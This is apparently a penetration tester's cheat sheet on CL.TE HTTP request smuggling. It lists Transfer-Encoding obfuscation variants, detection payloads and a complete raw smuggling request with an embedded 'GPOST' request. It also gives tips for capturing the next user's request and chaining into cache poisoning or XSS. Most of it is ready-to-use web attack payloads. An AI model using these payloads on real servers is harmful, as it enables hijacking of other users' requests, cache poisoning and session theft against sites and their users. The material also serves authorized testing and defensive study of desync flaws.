# CL.TE Desync Attacks

Front-end uses Content-Length while Back-end uses Transfer-Encoding.

## Classic CL.TE >>> RQP
- Hide Transfer-Encoding from front-end
  - H-V discrepancy exploitation
    - Leading space: ` Transfer-Encoding: chunked`
    - Obfuscation variants
      - `Transfer-Encoding: xchunked`
      - `Transfer-Encoding : chunked`
      - `[space]Transfer-Encoding: chunked `
      - `Transfer-Encoding:[tab]chunked`
      - `X: X[\n]Transfer-Encoding: chunked`
      - 
      ```
      Transfer-Encoding :
      chunked
      ```
    - Duplicate TE with invalid value
      - 
      ```
        Transfer-Encoding : chunked
        Transfer-Encoding : coucou
      ```

## How to exploit when vulnerable

- HTTP/1.1
- Do not forget CL for embded POST request (set it with high value)
- Start POST request by 0\r\n\r\n

## Detect 

- Test with valid CL but without closing the chunk and put input at the end.
  -  ```
  Transfer-Encoding: chunked
  Content-Length: 4

  1
  A
  X
  ```
  - 'Smuggle attack CL.TE' via the Smuggler extension.  
    - If timeout or delay >>> Desync
    - else >>> No desync
- Confirm without error if well formed
  - 
  ```
  1
  A
  0


  ```

## Additionnal confirmation

 - With embdeed POST request
  - ```
    POST / HTTP/1.1
    Host: example.com
    Content-Length: 4
    Transfer-Encoding: chunked

    0


    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 200

    option1=x&ignore=
    ```
    - 'Smuggle attack CL.TE' via the Smuggler extension. 
- For GET request add a Trash header at the end to catch the content of the next request

## Expected Results

- 200 OK with normal page >>> No desync
  - Front-end blocked request
  - Back-end ignored TE header
- GPOST error >>> Desync successful
  - Back-end processed GPOST as separate request
  - Next step >>> RQP || Cache poison || XSS gadget
- Timeout then 400 Bad Request >>> Partial desync
  - Request parsing failed
  - Try different obfuscation variant
